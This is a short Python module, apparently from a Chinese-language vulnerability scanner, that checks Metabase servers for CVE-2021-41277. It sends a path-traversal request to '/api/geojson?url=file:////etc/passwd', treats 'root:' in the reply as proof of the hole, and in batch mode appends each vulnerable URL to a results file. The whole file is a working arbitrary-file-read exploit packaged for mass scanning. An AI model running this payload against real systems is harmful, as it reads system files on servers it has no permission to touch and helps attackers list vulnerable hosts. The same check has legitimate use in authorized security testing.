#! /usr/bin/python3
# -*- encoding: utf-8 -*-

from libs.outprint import OutPrintInfo,OutPrintInfoSuc
from libs.reqset import ReqSet
import requests

class Cve_2021_41277:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        url2 = url + '/api/geojson?url=file:////etc/passwd'
        try:
            req = requests.get(url2, timeout=3,verify=self.verify,proxies=self.proxy,headers=self.header)
            if "root:" in req.text:
                OutPrintInfoSuc("Metabase", f"存在Metabase任意文件读取 {url2}")
                if self.batch:
                    with open("./result/metabase_2021_41277.txt","a") as w:
                        w.write(f"{url2}\n")
        except:
            if not self.batch:
                OutPrintInfo("Metabase", "目标访问错误")
            return
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(header=header, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=header)
            self.headers = req["header"]
        if not self.batch:
            OutPrintInfo("Metabase", "开始检测Metabase任意文件读取...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("Metabase", "Metabase任意文件读取检测结束")
